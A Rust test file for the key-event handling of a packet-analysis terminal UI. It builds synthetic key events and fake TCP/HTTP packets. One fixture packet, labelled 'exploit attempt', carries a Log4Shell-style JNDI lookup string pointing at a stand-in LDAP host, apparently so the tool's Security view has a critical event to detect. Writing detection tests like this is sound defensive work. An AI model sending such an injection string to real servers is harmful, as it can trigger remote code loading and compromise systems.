#![cfg(feature = "terminal-ui")]

//! Key-event handler tests.
//!
//! Strategy: construct an App with `new_for_test()` (no real capture, no UI),
//! send synthetic crossterm key events through `event::handle()`, and assert
//! on the resulting App state.
//!
//! Uses `rstest` for parametrized cases that cover every tab-switch key and
//! every important per-tab action key.

use crossterm::event::{Event, KeyCode, KeyEvent, KeyModifiers};
use packrat_tui::analysis::traffic_latch::{LatchMode, LatchStatus};
use packrat_tui::app::{
    self, App, CliAction, InvestigationView, SecuritySubTab, StartupMode, StartupOptions,
};
use packrat_tui::event;
use packrat_tui::net::packet::Packet;
use packrat_tui::tabs::{Tab, Workspace};
use rstest::rstest;

// ─── Helpers ─────────────────────────────────────────────────────────────────

fn key(code: KeyCode) -> Event {
    Event::Key(KeyEvent::new(code, KeyModifiers::NONE))
}

fn ctrl(c: char) -> Event {
    Event::Key(KeyEvent::new(KeyCode::Char(c), KeyModifiers::CONTROL))
}

fn shift(c: char) -> Event {
    Event::Key(KeyEvent::new(KeyCode::Char(c), KeyModifiers::SHIFT))
}

fn alt(code: KeyCode) -> Event {
    Event::Key(KeyEvent::new(code, KeyModifiers::ALT))
}

fn packet(no: u64) -> Packet {
    Packet {
        capture: None,
        no,
        timestamp: no as f64,
        src: "192.0.2.10".into(),
        dst: "198.51.100.7".into(),
        protocol: "TLS".into(),
        length: 64,
        info: "test packet".into(),
        src_port: Some(50000),
        dst_port: Some(443),
        vlan_id: None,
        vlan_pcp: None,
        vlan_dei: None,
        outer_vlan_id: None,
        bytes: vec![0_u8; 64],
    }
}

fn tcp_packet(no: u64) -> Packet {
    let mut bytes = vec![
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x08, 0x00, 0x45,
        0x00, 0x00, 0x28, 0x12, 0x34, 0x00, 0x00, 64, 6, 0x00, 0x00, 192, 0, 2, 10, 198, 51, 100,
        7,
    ];
    bytes.extend(50_000u16.to_be_bytes());
    bytes.extend(443u16.to_be_bytes());
    bytes.extend(0x0102_0304u32.to_be_bytes());
    bytes.extend(0x0506_0708u32.to_be_bytes());
    bytes.extend([0x50, 0x18, 0x10, 0x00, 0, 0, 0, 0]);
    let mut pkt = packet(no);
    pkt.bytes = bytes;
    pkt.length = pkt.bytes.len() as u16;
    pkt
}

fn tcp_payload_packet(no: u64, payload: &[u8]) -> Packet {
    let mut pkt = tcp_packet(no);
    let total_len = (40 + payload.len()) as u16;
    pkt.bytes[16..18].copy_from_slice(&total_len.to_be_bytes());
    pkt.bytes.extend_from_slice(payload);
    pkt.length = pkt.bytes.len() as u16;
    pkt.protocol = "HTTP".into();
    pkt
}

fn critical_packet() -> packrat_tui::net::packet::Packet {
    packrat_tui::net::packet::Packet {
        capture: None,
        no: 77,
        timestamp: 12.5,
        src: "203.0.113.7".into(),
        dst: "10.0.0.5".into(),
        protocol: "HTTP".into(),
        length: 128,
        info: "exploit attempt".into(),
        src_port: Some(44444),
        dst_port: Some(8080),
        vlan_id: None,
        vlan_pcp: None,
        vlan_dei: None,
        outer_vlan_id: None,
        bytes: b"GET /${jndi:ldap://203.0.113.7/x}".to_vec(),
    }
}

fn live_critical_packet() -> Packet {
    use packrat_tui::net::packet::{CaptureMetadata, CaptureTimestamp, TimestampResolution};
    let mut packet = critical_packet();
    packet.capture = Some(CaptureMetadata {
        timestamp: Some(CaptureTimestamp {
            ticks: 1,
            resolution: TimestampResolution::Decimal(0),
            offset_seconds: 0,
        }),
        captured_length: packet.bytes.len() as u32,
        wire_length: packet.bytes.len() as u32,
        link_type: 1,
        interface_id: 0,
        section_id: 0,
        interface_name: Some("test-live".into()),
        comments: Vec::new(),
    });
    packet
}

// ─── Notebook tab ─────────────────────────────────────────────────────────────

fn nb_app() -> App {
    let mut app = App::new_for_test();
    app.active_tab = Tab::Notebook;
    app
}

// ─── Hosts tab ────────────────────────────────────────────────────────────────

fn hosts_app() -> App {
    let mut app = App::new_for_test();
    app.active_tab = Tab::Hosts;
    app
}

// ─── Security tab ─────────────────────────────────────────────────────────────

fn sec_app() -> App {
    let mut app = App::new_for_test();
    app.active_tab = Tab::Security;
    app
}

// ─── Objects tab ─────────────────────────────────────────────────────────────

fn objects_app() -> App {
    let mut app = App::new_for_test();
    app.active_tab = Tab::Objects;
    app
}

#[path = "event/cases_1.rs"]
mod cases_1;
#[path = "event/cases_2.rs"]
mod cases_2;
#[path = "event/cases_3.rs"]
mod cases_3;
#[path = "event/cases_4.rs"]
mod cases_4;
#[path = "event/cases_5.rs"]
mod cases_5;
